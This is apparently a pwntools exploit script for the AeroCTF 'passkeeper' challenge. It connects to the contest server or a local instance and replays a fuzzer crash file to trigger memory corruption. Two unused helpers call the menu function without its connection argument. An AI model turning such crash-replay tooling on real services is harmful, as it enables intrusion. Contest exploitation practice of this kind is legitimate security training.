#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./passkeeper"

rhp1 = {'host':"tasks.aeroctf.com",'port':33039}
rhp2 = {'host':"localhost",'port':12370}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _keep(conn,p):
  hoge(conn,1)
  conn.recvuntil("password: ")
  conn.send(p)

def _view(conn,ix):
  hoge(conn,2)
  conn.recvuntil("id: ")
  conn.sendline(str(ix))

def _delete(conn,ix):
  hoge(conn,4)
  conn.recvuntil("id: ")
  conn.sendline(str(ix))

def _view_profile(conn):
  hoge(6)

def _change_secret(conn,s):
  hoge(7)
  conn.recvuntil("secret: ")
  conn.send(s)

def _all_delete(conn):
  hoge(conn,5)

def _get_name(conn):
  hoge(conn,6)
  conn.recvuntil("as ")
  return conn. recvline().rstrip()


max_num_pass = 0x10
max_len_pass = 0x30

def exploit(conn):
  with open("./output/crashes/id:000000,sig:11,src:000027,time:69264,op:flip2,pos:81","rb") as f:
  #with open("./output/crashes/id:000001,sig:06,src:000029,time:154699,op:havoc,rep:16") as f:
    content = f.read()
  
  print(content)
  conn.send(content)
  


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

